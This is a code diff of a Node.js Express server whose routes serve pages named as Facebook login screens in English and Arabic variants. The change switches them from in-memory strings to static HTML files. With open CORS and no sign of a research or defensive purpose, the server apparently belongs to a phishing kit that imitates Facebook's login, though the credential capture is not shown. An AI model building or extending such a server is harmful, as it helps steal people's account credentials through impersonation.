@@ -7,6 +7,7 @@ const dibase = require('./module/DIBASE')
 const app = express()
 const server = http.createServer(app)
 const wss = new websocket.Server({ server })
+const fs = require('fs')
 const PORT = 2007; 
 var PAGES = {}
 const domains ={
@@ -24,7 +25,6 @@ app.use(cors({
     origin:'*'
 }))
 
-
 app.use(express.urlencoded({ extended: true }))
 app.use(express.static('./PUB'))
 app.get('/',(req, res)=>{
@@ -34,21 +34,22 @@ app.get('/facebook-login/:dORf/:leng',(req, res)=>{
     let { dORf, leng } = req.params
     if (dORf == 'd') {
         if (leng == 'en') {
-            res.send(PAGES['facebook-login-default-en'])
+            res.sendFile(__dirname + '/PUB/facebook-login-d-en.html')
             return
         }
         if (leng == 'ar') {
-            res.send(PAGES['facebook-login-default-ar'])
+            res.sendFile(__dirname + '/PUB/facebook-login-d-ar.html')
             return
         }
     }
     if (dORf == 'f') {
         if (leng == 'en') {
-            res.send(PAGES['facebook-login-en'])
+            res.sendFile(__dirname + '/PUB/facebook-login-en.html')
+            
             return
         }
         if (leng == 'ar') {
-            res.send(PAGES['facebook-login-ar'])
+            res.sendFile(__dirname + '/PUB/facebook-login-ar.html')
             return
         }
     }
